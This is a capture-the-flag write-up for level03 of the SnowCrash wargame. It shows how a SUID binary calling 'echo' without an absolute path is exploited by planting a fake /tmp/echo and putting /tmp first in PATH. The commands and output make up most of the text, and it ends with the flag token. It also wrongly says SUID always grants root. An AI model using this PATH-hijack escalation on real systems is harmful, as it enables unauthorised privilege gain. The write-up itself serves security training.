In home directory we have executable file with SUID attribute:
```shell
level03@SnowCrash:~$ ls -la level03 
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03 
Exploit me
```
Using ltrace - a library call tracer.
ltrace is a program that simply runs the specified command
until  it  exits.   It  intercepts and records the dynamic
library calls which are called by the executed process and
the  signals  which  are received by that process.
```shell
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                               = 2003
geteuid()                               = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                  = 0
+++ exited (status 0) +++
```
We can see here 
<system("/usr/bin/env echo Exploit me"Exploit me>
that echo command is called without absolute path. This is a common path vulnerability. 

Real echo command can be changed with fake one.
When the setuid attribute is set on a file, the normal user who executes the file is elevated to the root.
End we can call the getflag command from fake echo file with root privilege.
```shell
level03@SnowCrash:~$ echo getflag > /tmp/echo 
level03@SnowCrash:~$ chmod +x /tmp/echo
```
Changing the PATH to run fake echo command before real echo
```shell
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ echo $PATH
/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
```
Now executeing our file:
```shell
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```